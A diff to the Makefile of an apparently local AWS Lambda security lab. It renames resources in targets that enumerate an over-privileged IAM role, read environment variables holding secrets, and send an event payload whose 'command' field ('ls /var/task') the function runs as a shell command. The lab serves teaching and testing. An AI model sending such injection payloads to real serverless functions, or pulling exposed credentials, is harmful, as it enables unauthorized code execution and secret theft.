@@ -25,17 +25,17 @@ enumerate:   ## Run cloudfox to enumerate Lambda permissions
 		awslocal lambda list-functions --query "Functions[*].[FunctionName,Role]" --output table; \
 		echo ""; \
 		echo "=== Role policies ==="; \
-		awslocal iam list-role-policies --role-name meridian-notifier-role; \
+		awslocal iam list-role-policies --role-name notifier-role; \
 		echo ""; \
 		echo "=== Inline policy ==="; \
 		awslocal iam get-role-policy \
-			--role-name meridian-notifier-role \
-			--policy-name MeridianNotifierPolicy | jq .PolicyDocument'
+			--role-name notifier-role \
+			--policy-name NotifierPolicy | jq .PolicyDocument'
 
 invoke:      ## Invoke the Lambda with a normal payload
 	docker compose run --rm lab sh -c '\
 		awslocal lambda invoke \
-			--function-name meridian-notifier \
+			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","event_type":"payment"}'"'"' \
 			/tmp/response.json && cat /tmp/response.json | jq .'
 
@@ -43,7 +43,7 @@ inject:      ## Invoke with injection payload — shows command output in respon
 	docker compose run --rm lab sh -c '\
 		echo "Sending injection payload..."; \
 		awslocal lambda invoke \
-			--function-name meridian-notifier \
+			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","command":"ls /var/task"}'"'"' \
 			/tmp/inject-response.json && \
 		jq -r ".body" /tmp/inject-response.json | jq .command_output'
@@ -57,25 +57,25 @@ demo:        ## Full worked demo: enumerate → normal invoke → injection
 	@echo "== 2. Inspect over-privileged role =="
 	docker compose run --rm lab sh -c '\
 		awslocal iam get-role-policy \
-			--role-name meridian-notifier-role \
-			--policy-name MeridianNotifierPolicy 2>/dev/null | jq .PolicyDocument.Statement[].Action'
+			--role-name notifier-role \
+			--policy-name NotifierPolicy 2>/dev/null | jq .PolicyDocument.Statement[].Action'
 	@echo ""
 	@echo "== 3. Check environment variables (sensitive data in env) =="
 	docker compose run --rm lab awslocal lambda get-function-configuration \
-		--function-name meridian-notifier \
+		--function-name notifier \
 		--query "Environment.Variables" --output json
 	@echo ""
 	@echo "== 4. Normal invocation =="
 	docker compose run --rm lab sh -c '\
 		awslocal lambda invoke \
-			--function-name meridian-notifier \
+			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","event_type":"payment"}'"'"' \
 			/tmp/demo-response.json && jq . /tmp/demo-response.json'
 	@echo ""
 	@echo "== 5. Injection: list function source files =="
 	docker compose run --rm lab sh -c '\
 		awslocal lambda invoke \
-			--function-name meridian-notifier \
+			--function-name notifier \
 			--payload '"'"'{"account_id":"ACC-001","command":"ls /var/task"}'"'"' \
 			/tmp/inject.json && \
 		echo "Response body:" && \
@@ -84,4 +84,4 @@ demo:        ## Full worked demo: enumerate → normal invoke → injection
 	@echo "== Finding summary =="
 	@echo "1. Over-privileged role: s3:*, iam:*, sts:AssumeRole * (T1078)"
 	@echo "2. Event injection: command field executed in subprocess (OWASP Serverless #1)"
-	@echo "3. Env vars: MERIDIAN_API_KEY and DB_CONNECTION_STRING exposed (T1552)"
+	@echo "3. Env vars: APP_API_KEY and DB_CONNECTION_STRING exposed (T1552)"
